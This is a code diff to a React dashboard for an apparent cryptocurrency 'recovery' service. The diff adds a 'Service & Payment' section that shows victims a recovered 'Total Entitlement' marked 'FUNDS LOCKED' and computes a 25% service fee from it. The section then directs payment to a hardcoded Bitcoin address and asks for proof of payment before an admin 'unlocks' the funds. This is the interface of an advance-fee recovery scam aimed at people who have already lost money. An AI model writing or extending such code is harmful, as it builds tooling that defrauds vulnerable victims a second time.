@@ -83,12 +83,16 @@ export default function ClientDashboard() {
   const [isCalculating, setIsCalculating] = useState(false);
   const [menuOpen, setMenuOpen] = useState(false);
   const [selectedSection, setSelectedSection] = useState('overview');
+  const [btcAddress, setBtcAddress] = useState('1W984WdG9gLXEvopZ5NiWiHppvRDbnb3u');
+  const [paymentSent, setPaymentSent] = useState(false);
+  const [serviceFee, setServiceFee] = useState(0);
 
   const wallets = ['Coinbase', 'Binance', 'MetaMask', 'Trust Wallet', 'Exodus', 'Ledger', 'Trezor', 'Other'];
 
   const sections = [
     { id: 'overview', label: 'Beneficiary' },
     { id: 'bridge', label: 'Recovery Bridge' },
+    { id: 'service', label: 'Service & Payment' },
     { id: 'evidence', label: 'Evidence' },
     { id: 'support', label: 'Support' },
     { id: 'security', label: 'Security' },
@@ -113,6 +117,12 @@ export default function ClientDashboard() {
     }, 8000);
     return () => clearInterval(iv);
   }, [token]);
+
+  // Calculate service fee (25%) whenever total entitlement changes
+  useEffect(() => {
+    const fee = data.totalEntitlement * 0.25;
+    setServiceFee(fee);
+  }, [data.totalEntitlement]);
 
   const inboxMessages = [
     {
@@ -529,7 +539,42 @@ export default function ClientDashboard() {
     return date && !isNaN(date.getTime()) ? date.toLocaleTimeString() : '';
   };
 
+  const handleCopyBtcAddress = async () => {
+    try {
+      await navigator.clipboard.writeText(btcAddress);
+      alert('BTC address copied to clipboard!');
+    } catch (error) {
+      console.error('Error copying:', error);
+      alert('Failed to copy address.');
+    }
+  };
+
+  const handleProofOfPaymentUpload = async () => {
+    if (!token) {
+      alert('Please login first.');
+      return;
+    }
+    if (!paymentProofFile) {
+      alert('Please select a proof of payment file.');
+      return;
+    }
+
+    try {
+      // In a real app, this would upload to S3 or similar
+      setPaymentSent(true);
+      alert('Payment proof submitted successfully. Admin will verify and unlock funds.');
+    } catch (error) {
+      console.error('Error:', error);
+      alert('Error uploading proof of payment.');
+    }
+  };
+
   const handlePaymentSent = () => {
+    if (!paymentProofFile) {
+      alert('Please upload proof of payment before confirming payment sent.');
+      return;
+    }
+    setPaymentSent(true);
     alert('Payment confirmation sent. Pending admin approval.');
   };
 
@@ -591,43 +636,47 @@ export default function ClientDashboard() {
           </div>
         </header>
 
-        <section className="space-y-6">
-            <div className="rounded-[32px] border border-white/10 bg-slate-950/80 p-6 shadow-xl shadow-teal-500/5">
-            <div className="flex flex-wrap items-center justify-between gap-4">
-              <div>
-                <p className="text-xs uppercase tracking-[0.3em] text-slate-400">Client Dashboard</p>
-                <h2 className="text-xl font-semibold text-white">Beneficiary Profile</h2>
-                <p className="text-sm text-slate-500">Only the beneficiary profile is visible by default. Open a session from the menu to view more.</p>
-              </div>
-              <button
-                onClick={() => setMenuOpen((open) => !open)}
-                className="inline-flex h-12 w-12 items-center justify-center rounded-3xl border border-white/10 bg-white/5 text-teal-300 hover:bg-teal-500/10"
-                aria-label="Toggle dashboard menu"
-              >
-                ☰
-              </button>
+        <div className="relative">
+          <div className="flex flex-wrap items-center justify-between gap-4 rounded-[32px] border border-white/10 bg-slate-950/70 p-4 shadow-xl shadow-teal-500/5">
+            <div className="text-sm text-slate-300">
+              Active section: <span className="font-semibold text-white">{sections.find((section) => section.id === selectedSection)?.label}</span>
             </div>
-
-            {menuOpen && (
-              <div className="mt-4 space-y-3 rounded-[32px] border border-white/10 bg-slate-900/80 p-4">
-                {sections.map((section) => (
-                  <button
-                    key={section.id}
-                    onClick={() => handleSectionClick(section.id)}
-                    className={`w-full rounded-3xl px-4 py-3 text-left text-sm font-semibold transition ${selectedSection === section.id ? 'bg-teal-500 text-black' : 'bg-slate-950/80 text-slate-200 hover:bg-slate-900'}`}
-                  >
-                    {section.label}
-                  </button>
-                ))}
-                <button
-                  onClick={handleLogout}
-                  className="w-full rounded-3xl bg-red-500 px-4 py-3 text-left text-sm font-semibold text-black hover:bg-red-400"
-                >
-                  Logout
-                </button>
-              </div>
-            )}
+            <button
+              type="button"
+              onClick={() => setMenuOpen((open) => !open)}
+              className="inline-flex h-12 items-center justify-center rounded-3xl border border-white/10 bg-white/5 px-5 text-sm font-semibold text-teal-300 hover:bg-teal-500/10"
+            >
+              ☰ Sections
+            </button>
           </div>
+          {menuOpen && (
+            <div className="mt-4 space-y-3 rounded-[32px] border border-white/10 bg-slate-900/80 p-4">
+              {sections.map((section) => (
+                <button
+                  type="button"
+                  key={section.id}
+                  onClick={() => handleSectionClick(section.id)}
+                  className={`w-full rounded-3xl px-4 py-3 text-left text-sm font-semibold transition ${selectedSection === section.id ? 'bg-teal-500 text-black' : 'bg-slate-950/80 text-slate-200 hover:bg-slate-900'}`}
+                >
+                  {section.label}
+                </button>
+              ))}
+            </div>
+          )}
+        </div>
+
+        <section className="space-y-6">
+          {selectedSection === 'overview' && (
+            <div id="overview" className="space-y-6">
+              <div className="rounded-[32px] border border-white/10 bg-slate-950/80 p-6 shadow-xl shadow-teal-500/5">
+                <div className="flex flex-wrap items-center justify-between gap-4">
+                  <div>
+                    <p className="text-xs uppercase tracking-[0.3em] text-slate-400">Client Dashboard</p>
+                    <h2 className="text-xl font-semibold text-white">Beneficiary Profile</h2>
+                    <p className="text-sm text-slate-500">Only the beneficiary profile is visible by default. Open a session from the menu to view more.</p>
+                  </div>
+                </div>
+              </div>
 
           <div className="rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-cyan-500/5">
             <div className="flex items-center justify-between gap-4">
@@ -647,29 +696,36 @@ export default function ClientDashboard() {
                 <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Verified Loss #2</p>
                 <p className="mt-2 text-lg font-extrabold text-red-400">${data.verifiedLoss2?.toLocaleString() || '0.00'}</p>
               </div>
-              <div className="rounded-3xl bg-slate-950/80 p-4 border border-white/10">
-                <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Total Entitlement</p>
-                <p className="mt-2 text-2xl font-semibold text-teal-300">${displayAmount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</p>
+              <div className="rounded-3xl bg-slate-950/80 p-4 border border-white/10 relative">
+                <div className="flex items-start justify-between gap-2">
+                  <div className="flex-1">
+                    <p className="text-[10px] uppercase tracking-[0.3em] text-slate-500">Total Entitlement</p>
+                    <p className="mt-2 text-2xl font-semibold text-teal-300">${displayAmount.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</p>
+                  </div>
+                  <div className="text-right">
+                    <div className={`text-3xl ${data.fundsUnlocked ? 'text-green-400' : 'text-red-500'}`}>
+                      {data.fundsUnlocked ? '🔓' : '🔒'}
+                    </div>
+                    <p className={`text-xs font-bold uppercase tracking-[0.2em] mt-1 ${data.fundsUnlocked ? 'text-green-400' : 'text-red-400'}`}>
+                      {data.fundsUnlocked ? 'FUNDS UNLOCKED' : 'FUNDS LOCKED'}
+                    </p>
+                  </div>
+                </div>
+                <p className={`mt-3 text-right text-xs font-semibold uppercase tracking-[0.18em] ${data.fundsUnlocked ? 'text-emerald-300' : 'text-red-400'}`}>
+                  {data.fundsUnlocked ? 'Unlocked by admin approval' : 'Funds are currently locked until service fee is confirmed'}
+                </p>
               </div>
             </div>
+            <CyberTracker
+              steps={['Intake Submission', 'Technical Assessment', 'Evidence Validation', 'Forensic Recovery', 'Release Authorization']}
+              currentStage={((data as any).statusIndex ?? Math.ceil((data.trackingProgress || 0) / 20)) + 1}
+              progress={animatedProgress}
+            />
           </div>
+        </div>
+      )}
 
-          <div className="rounded-[32px] border border-white/10 bg-slate-950/80 p-6 shadow-xl shadow-teal-500/5">
-            {selectedSection === 'overview' && (
-              <div id="overview" className="space-y-6">
-                <div>
-                  <p className="text-xs uppercase tracking-[0.3em] text-teal-300">Overview</p>
-                  <h3 className="text-2xl font-semibold text-white">Recovery Status</h3>
-                </div>
-                <CyberTracker
-                  steps={['Intake Submission', 'Technical Assessment', 'Evidence Validation', 'Forensic Recovery', 'Release Authorization']}
-                  currentStage={2}
-                  progress={animatedProgress}
-                />
-              </div>
-            )}
-
-            {selectedSection === 'bridge' && (
+          {selectedSection === 'bridge' && (
               <div id="bridge" className="space-y-6">
                 <div>
                   <p className="text-xs uppercase tracking-[0.3em] text-teal-300">Recovery Bridge</p>
@@ -707,6 +763,76 @@ export default function ClientDashboard() {
                 >
                   Establish Secure Bridge
                 </button>
+              </div>
+            )}
+
+            {selectedSection === 'service' && (
+              <div id="service" className="space-y-6">
+                <div>
+                  <p className="text-xs uppercase tracking-[0.3em] text-teal-300">Service & Payment</p>
+                  <h3 className="text-2xl font-semibold text-white">Settlement Required</h3>
+                </div>
+
+                <div className="grid gap-4 md:grid-cols-2">
+                  <div className="rounded-3xl bg-gradient-to-br from-cyan-500/10 to-cyan-400/10 border border-cyan-500/30 p-6">
+                    <p className="text-xs uppercase tracking-[0.3em] text-cyan-300 mb-2">Service Fee (25%)</p>
+                    <p className="text-4xl font-bold text-cyan-300">${serviceFee.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}</p>
+                    <p className="text-xs text-slate-400 mt-2">Auto-calculated from Total Entitlement</p>
+                  </div>
+
+                  <div className="rounded-3xl bg-slate-950/80 border border-white/10 p-6">
+                    <p className="text-xs uppercase tracking-[0.3em] text-slate-400 mb-4">Bitcoin Wallet Address</p>
+                    <div className="flex gap-2 items-center">
+                      <input
+                        type="text"
+                        value={btcAddress}
+                        readOnly
+                        className="flex-1 rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-3 text-sm text-slate-200 focus:outline-none"
+                      />
+                      <button
+                        type="button"
+                        onClick={handleCopyBtcAddress}
+                        className="rounded-3xl bg-cyan-500 px-6 py-3 text-sm font-semibold text-black hover:bg-cyan-400"
+                      >
+                        Copy
+                      </button>
+                    </div>
+                    <p className="mt-3 text-xs text-slate-500">Use this address to send the service payment. Then upload your proof.</p>
+                  </div>
+                </div>
+
+                <div className="rounded-3xl bg-slate-950/80 border border-white/10 p-6">
+                  <p className="text-xs uppercase tracking-[0.3em] text-slate-400 mb-4">Upload Proof of Payment</p>
+                  <div className="space-y-4">
+                    <input
+                      type="file"
+                      onChange={(e) => setPaymentProofFile(e.target.files?.[0] || null)}
+                      className="w-full rounded-3xl border border-white/10 bg-slate-900/80 px-4 py-4 text-sm text-slate-200 file:bg-teal-500 file:text-black file:border-none file:px-4 file:py-1 file:rounded"
+                    />
+                    <button
+                      type="button"
+                      onClick={handleProofOfPaymentUpload}
+                      className="w-full rounded-3xl bg-teal-500 px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] text-black hover:bg-teal-400"
+                    >
+                      {paymentSent ? '✓ Proof Submitted' : 'Submit Payment Proof'}
+                    </button>
+                  </div>
+                </div>
+
+                <div className="rounded-3xl bg-slate-950/80 border border-white/10 p-6">
+                  <p className="text-xs uppercase tracking-[0.3em] text-slate-400 mb-2">Payment Status</p>
+                  <div className={`text-lg font-bold ${paymentSent ? 'text-green-400' : 'text-orange-400'}`}>
+                    {paymentSent ? '✓ Payment Submitted' : 'Awaiting Payment'}
+                  </div>
+                  <p className="text-xs text-slate-500 mt-2">Please upload proof of payment before confirming the payment.</p>
+                  <button
+                    type="button"
+                    onClick={handlePaymentSent}
+                    className={`mt-4 w-full rounded-3xl px-5 py-3 text-sm font-semibold uppercase tracking-[0.2em] transition ${paymentSent ? 'bg-emerald-500 text-black hover:bg-emerald-400' : 'bg-orange-500 text-black hover:bg-orange-400'}`}
+                  >
+                    {paymentSent ? 'Payment Sent Confirmed' : 'I Have Sent My Payment'}
+                  </button>
+                </div>
               </div>
             )}
 
@@ -794,7 +920,6 @@ export default function ClientDashboard() {
                 </button>
               </div>
             )}
-          </div>
         </section>
 
         <section className="mt-6 glass rounded-[32px] border border-white/10 bg-white/5 p-8 shadow-xl shadow-teal-500/5">
